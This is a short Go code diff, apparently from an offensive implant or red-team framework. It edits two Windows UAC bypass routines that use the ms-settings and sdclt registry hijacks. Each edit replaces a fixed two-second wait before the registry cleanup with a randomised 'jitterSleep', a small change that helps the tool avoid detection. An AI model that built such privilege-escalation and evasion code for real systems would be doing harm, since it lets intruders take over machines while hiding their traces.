@@ -146,7 +146,7 @@ func uacBypassMsSettings(command, triggerBinary, techniqueName string) structs.C
 	output += fmt.Sprintf("[+] Launched %s via ShellExecute\n", triggerBinary)
 
 	// Step 3: Wait briefly then clean up registry
-	time.Sleep(2 * time.Second)
+	jitterSleep(1500*time.Millisecond, 3*time.Second)
 	output += "[*] Step 3: Cleaning up registry (shredding values)...\n"
 	cleanupMsSettingsKey()
 	output += "[+] Registry keys shredded and removed\n\n"
@@ -214,7 +214,7 @@ func uacBypassSdclt(command string) structs.CommandResult {
 	output += "[+] Launched sdclt.exe via ShellExecute\n"
 
 	// Step 3: Wait briefly then clean up registry
-	time.Sleep(2 * time.Second)
+	jitterSleep(1500*time.Millisecond, 3*time.Second)
 	output += "[*] Step 3: Cleaning up registry (shredding values)...\n"
 	cleanupSdcltKey()
 	output += "[+] Registry keys shredded and removed\n\n"
